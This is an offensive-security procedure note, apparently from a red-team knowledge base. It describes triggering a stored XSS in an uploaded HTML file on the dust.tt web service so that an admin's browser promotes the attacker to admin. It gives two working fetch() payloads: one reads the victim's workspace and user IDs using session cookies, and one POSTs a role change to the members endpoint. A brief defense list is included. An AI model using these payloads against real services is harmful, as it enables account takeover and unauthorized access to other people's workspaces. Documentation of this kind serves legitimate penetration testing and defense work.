---
tags:
  - xss
  - privilege-escalation
  - js-execution
type: procedure
tools:
  - '[[tools/Web-Browser]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/fetch-user-data-js]]'
  - '[[commands/promote-to-admin-js]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-13T23:55:38.410Z'
sub_techniques: []
id: 20b62d16-99b2-4930-830f-eb3a32effd01
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Valid Accounts]]'
---
# Trigger-XSS-for-Privilege-Escalation

## Summary

This procedure details the execution of the stored XSS payload when the admin visits the malicious file URL, running JavaScript to discover user data and escalate the attacker's privileges to admin.

## Description

The uploaded HTML file contains JS that, upon rendering in the admin's browser, uses fetch API with credentials:'include' to make authenticated requests. It first retrieves the current user's workspaces and IDs, then POSTs to the members endpoint to update the attacker's role to 'admin', achieving escalation and potential full takeover.

## Requirements

1. Admin's authenticated browser session
2. Malicious file URL visited
3. Attacker's user ID known (hardcoded in payload)

## Defense

Defensive measures and detection strategies:

- Enforce strict Content-Security-Policy on file views
- Validate all API requests for role changes (e.g., require elevated auth)
- Monitor for unexpected JS execution or API calls from file views
- Rate-limit or audit member promotion endpoints

## Objectives

1. Execute JS in victim's context for authenticated actions
2. Escalate privileges via API manipulation
3. Gain admin control for workspace access

## Instructions

### Step 1: Visit Malicious URL

**Context**: Admin opens the shared link in browser, triggering HTML render and JS auto-execution.

**Instructions**: Use [[tools/Web-Browser]] to navigate to the downloadUrl?action=view. The file serves as HTML, running the embedded script.

### Step 2: Fetch User Data

**Context**: JS retrieves victim's user info to identify workspace and attacker IDs.

**Command** ([[commands/fetch-user-data-js]]):
```javascript
fetch('https://dust.tt/api/user',{method:'GET',headers:{'accept':'*/*','x-commit-hash':'41c0391'},credentials:'include'})
```

> Fetches user JSON including workspaces array and IDs.

### Step 3: Promote Attacker to Admin

**Context**: Use extracted IDs to POST role update for attacker.

**Command** ([[commands/promote-to-admin-js]]):
```javascript
fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`,{method:'POST',headers:{'content-type':'application/json','accept':'*/*','x-commit-hash':'41c0391'},credentials:'include',body:JSON.stringify({role:"admin"})})
```

> Sends POST to escalate role, using victim's cookies.

**Expected Output**: 200 OK response, role updated to admin.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[JavaScript]] JavaScript
- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/fetch-user-data-js]]
- [[commands/promote-to-admin-js]]

## Tools Used

- [[tools/Web-Browser]]

## Tags

- [[xss]]
- [[privilege-escalation]]
- [[js-execution]]
